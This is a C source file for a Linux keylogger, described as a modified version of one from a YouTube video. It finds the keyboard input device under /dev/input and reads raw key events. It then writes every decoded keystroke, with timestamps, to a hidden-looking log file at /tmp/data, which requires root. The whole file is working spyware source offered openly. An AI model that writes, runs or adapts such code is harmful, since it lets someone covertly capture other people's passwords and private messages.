/* Compile and run with: g++ -c logger.c -o exec; sudo ./exec.
 * 
 * This implementation is a modified version of Joey Abrams' keylogger from:
 * https://www.youtube.com/watch?v=89k3llI51fU.
 * 
 */

#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <pthread.h>

#define LOGFILE "/tmp/data"

// sets the event handler
char* set_input();

// starts the logging thread
void log_r(const char *driver);

// timestamps the logfile
void delimit(FILE *fp);

// bundled flushing and printing into a function
// FIXME: this adds overhead but is necessary for a/a+
void print_safe(FILE *fp, const char *data);

// maps enum variants to codes from the event struct to handle without
// numbers hardcoded into a switch
void special_char_check(const int code);

int main(int argc, char **argv) {

  // find the keyboard driver
  char *driver = set_input();

  // log from character device driver
  if(driver)
    log_r(driver);

}

char* set_input() {

  FILE *fptr = fopen("/proc/bus/input/devices", "r");
  
  if(!fptr)
    return "ERR: failure";
  
  char *driver = (char*)malloc(500 * sizeof(char));
  strcpy(driver, "/dev/input/");
  
  const char *s = "keyboard";
  char buf[500]; // tmp

  while( fgets(buf, 500, fptr) ) {
    char *ret = strstr(buf, s);
    if(ret) {

      // locate event handler line by offset
      for(int i = 0; i < 4; ++i)
	fgets(buf, 500, fptr);

      // find the event handler number
      // FIXME: refactor
      char tmp[20];
      for(int i = 0; i < 500; ++i) {
	if(buf[i] == 'e' && buf[i+1] == 'v') {
	  for(int c = 0; c < 6; c++) {
	    tmp[c] = buf[i+c];
	  }
	}
      }
      
      strcat(driver, tmp);
    }
  }

  return driver;
}

void log_r(const char *driver) {
  struct input_event ev;
  int fd = open(driver, O_RDONLY);
  FILE *fp = fopen(LOGFILE, "a");

  char *map = "..1234567890-=..qwertyuiop[]..asdfghjkl;'`.\\zxcvbnm,./";

  while(1) {
    time_t before = clock();
    
    read(fd, &ev, sizeof(ev));
    if((ev.type == EV_KEY) && (ev.value == 0)) {

      // split log file with current time
      time_t diff = clock() - before;
      
      if(diff > 60)
	delimit(fp);
      
      switch(ev.code) {
      case(0):
	print_safe(fp, "KEY_RESERVED");
	break;
      case(1):
	print_safe(fp, "KEY_ESC");
	break;
      case(14):
	print_safe(fp, "KEY_BACKSPACE");
	break;
      case(15):
	print_safe(fp, "KEY_TAB");
	break;
      case(28):
	print_safe(fp, "KEY_ENTER");
	break;
      case(29):
	print_safe(fp, "KEY_LEFTCTRL");
	break;
      case(42):
	print_safe(fp, "KEY_LEFTSHIFT");
	break;
      case(57):
	print_safe(fp, "KEY_SPACE");
	break;
      default:
	fflush(fp);
	fprintf(fp, "%c\n", map[ev.code]);
      }
    }
    before = clock();

  }

  fclose(fp);
  close(fd);
  
}

void delimit(FILE *fp) {

  time_t rawtime;
  struct tm * timeinfo;

  // this is required everywhere due to being in append mode
  fflush(fp);

  // print the time of logging to the file
  time ( &rawtime );
  timeinfo = localtime ( &rawtime );
  fprintf (fp, "[%s]", asctime (timeinfo) );

}

void print_safe(FILE *fp, const char *data) {

  fflush(fp);
  fprintf(fp, "%s", data);

}
